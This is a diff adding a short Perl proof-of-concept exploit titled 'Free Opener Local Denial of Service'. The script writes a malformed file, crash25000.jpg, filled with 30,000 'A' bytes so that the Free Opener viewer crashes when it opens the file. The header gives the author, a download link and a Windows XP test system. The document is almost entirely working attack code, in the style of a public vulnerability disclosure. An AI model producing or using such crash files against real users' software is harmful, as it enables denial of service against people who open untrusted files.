@@ -1,0 +1,19 @@
+#!/usr/bin/perl
+
+# Exploit Title:  Free Opener Local Denial of Service
+# Date: 09-12-11
+# Author: Iolo Morganwg
+# Download: http://dl.installiq.com/download/downloadpop.aspx?shortname=freeopener&a=13193&f=FO-Main
+# Tested on: Windows XP SP3
+
+#To trigger: Run script open with Free opener, program dies!.
+
+my $file= "crash25000.jpg";
+my $junk = "\x41" x 30000;
+# my $junk2 = "\x42" x 5000;
+
+open($FILE,">$file");
+print $FILE $junk.$junk2;
+close($FILE);
+
+print "File Created successfully\n";
